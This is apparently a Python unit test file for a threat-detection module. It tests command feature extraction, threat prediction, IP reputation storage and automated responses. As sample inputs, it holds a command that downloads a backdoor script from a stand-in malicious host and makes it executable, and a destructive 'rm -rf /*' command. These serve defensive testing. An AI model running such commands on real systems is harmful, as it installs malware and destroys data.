#!/usr/bin/env python3
"""
Unit tests for AI Threat Intelligence module
Tests the core machine learning and threat analysis functionality
"""

import unittest
import tempfile
import os
import sys
import numpy as np
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock

# Add parent directory to path to import modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ai_threat_intel import AIThreatIntelligence, ThreatDatabase, AutomatedResponseSystem


class TestAIThreatIntelligence(unittest.TestCase):
    """Test cases for AIThreatIntelligence class"""
    
    def setUp(self):
        """Set up test fixtures"""
        # Create temporary model file
        self.temp_dir = tempfile.mkdtemp()
        self.model_path = os.path.join(self.temp_dir, "test_model.pkl")
        self.ai_intel = AIThreatIntelligence(model_path=self.model_path)
    
    def tearDown(self):
        """Clean up test fixtures"""
        # Clean up temporary files
        if os.path.exists(self.model_path):
            os.remove(self.model_path)
        os.rmdir(self.temp_dir)
    
    def test_feature_extraction(self):
        """Test feature extraction from commands"""
        command = "wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh"
        session_data = {
            'session_id': 'test_session',
            'start_time': datetime.now() - timedelta(minutes=5),
            'login_attempts': 3
        }
        
        features = self.ai_intel.extract_features(command, session_data)
        
        # Check that all expected features are present
        expected_features = [
            'command_length', 'special_chars', 'common_tools', 
            'time_of_day', 'session_duration', 'login_attempts'
        ]
        
        self.assertEqual(len(features), len(expected_features))
        self.assertIsInstance(features[0], (int, float))  # command_length
        self.assertIsInstance(features[1], float)         # special_chars ratio
        self.assertIsInstance(features[2], int)           # common_tools count
    
    def test_threat_prediction(self):
        """Test threat prediction functionality"""
        command = "rm -rf /*"
        session_data = {
            'session_id': 'test_session',
            'start_time': datetime.now() - timedelta(minutes=2),
            'login_attempts': 1
        }
        
        prediction = self.ai_intel.predict_threat(command, session_data)
        
        # Check prediction structure
        required_keys = ['threat_type', 'confidence', 'risk_score', 'is_anomaly']
        for key in required_keys:
            self.assertIn(key, prediction)
        
        # Check value types and ranges
        self.assertIsInstance(prediction['threat_type'], str)
        self.assertIsInstance(prediction['confidence'], float)
        self.assertIsInstance(prediction['risk_score'], int)
        self.assertIsInstance(prediction['is_anomaly'], bool)
        
        # Risk score should be between 0 and 100
        self.assertGreaterEqual(prediction['risk_score'], 0)
        self.assertLessEqual(prediction['risk_score'], 100)
    
    def test_synthetic_data_generation(self):
        """Test synthetic training data generation"""
        data = self.ai_intel.generate_synthetic_training_data()
        
        self.assertIsInstance(data, list)
        self.assertGreater(len(data), 0)
        
        # Check first data point structure
        if data:
            sample = data[0]
            expected_keys = [
                'command', 'threat_type', 'command_length', 'special_chars',
                'common_tools', 'time_of_day', 'session_duration', 'login_attempts'
            ]
            for key in expected_keys:
                self.assertIn(key, sample)
    
    @patch('requests.get')
    async def test_external_intel_enrichment(self, mock_get):
        """Test external threat intelligence enrichment"""
        # Mock API response
        mock_response = MagicMock()
        mock_response.json.return_value = {
            'abuseConfidencePercentage': 75,
            'countryCode': 'US',
            'isp': 'Test ISP'
        }
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        ip = "192.168.1.100"
        intel = await self.ai_intel.enrich_with_external_intel(ip)
        
        # Check intel structure
        required_keys = ['reputation_score', 'country', 'org', 'threat_feeds', 'categories']
        for key in required_keys:
            self.assertIn(key, intel)
        
        # Check reputation score is valid
        self.assertIsInstance(intel['reputation_score'], int)
        self.assertGreaterEqual(intel['reputation_score'], 0)
        self.assertLessEqual(intel['reputation_score'], 100)


class TestThreatDatabase(unittest.TestCase):
    """Test cases for ThreatDatabase class"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.temp_db = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
        self.temp_db.close()
        self.db = ThreatDatabase(db_path=self.temp_db.name)
    
    def tearDown(self):
        """Clean up test fixtures"""
        os.unlink(self.temp_db.name)
    
    def test_store_prediction(self):
        """Test storing threat predictions"""
        prediction_data = {
            'command': 'test command',
            'session_id': 'test_session',
            'src_ip': '192.168.1.1',
            'predicted_threat': 'malware_download',
            'confidence': 0.85,
            'risk_score': 75,
            'is_anomaly': True
        }
        
        # Should not raise an exception
        self.db.store_prediction(prediction_data)
    
    def test_store_ip_intelligence(self):
        """Test storing IP intelligence data"""
        ip_data = {
            'ip_address': '192.168.1.1',
            'reputation_score': 25,
            'threat_categories': ['malware', 'botnet'],
            'country': 'US',
            'asn': 'AS12345',
            'threat_feeds': ['feed1', 'feed2']
        }
        
        # Should not raise an exception
        self.db.store_ip_intelligence(ip_data)


class TestAutomatedResponseSystem(unittest.TestCase):
    """Test cases for AutomatedResponseSystem class"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.response_system = AutomatedResponseSystem()
    
    @patch('subprocess.run')
    async def test_evaluate_and_respond(self, mock_subprocess):
        """Test automated response evaluation and execution"""
        mock_subprocess.return_value = MagicMock(returncode=0)
        
        prediction = {
            'threat_type': 'malware_download',
            'risk_score': 85,
            'confidence': 0.92,
            'is_anomaly': True
        }
        
        ip_intel = {
            'reputation_score': 15,
            'threat_feeds': ['malware_c2'],
            'categories': ['malware']
        }
        
        session_data = {
            'session_id': 'high_risk_session',
            'src_ip': '203.145.78.92'
        }
        
        responses = await self.response_system.evaluate_and_respond(
            prediction, ip_intel, session_data
        )
        
        self.assertIsInstance(responses, list)
        # High-risk scenario should trigger responses
        if responses:
            self.assertGreater(len(responses), 0)
    
    def test_calculate_combined_risk(self):
        """Test combined risk calculation"""
        prediction = {'risk_score': 80}
        ip_intel = {'reputation_score': 20}
        
        risk = self.response_system.calculate_combined_risk(prediction, ip_intel)
        
        self.assertIsInstance(risk, (int, float))
        self.assertGreaterEqual(risk, 0)
        self.assertLessEqual(risk, 100)


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
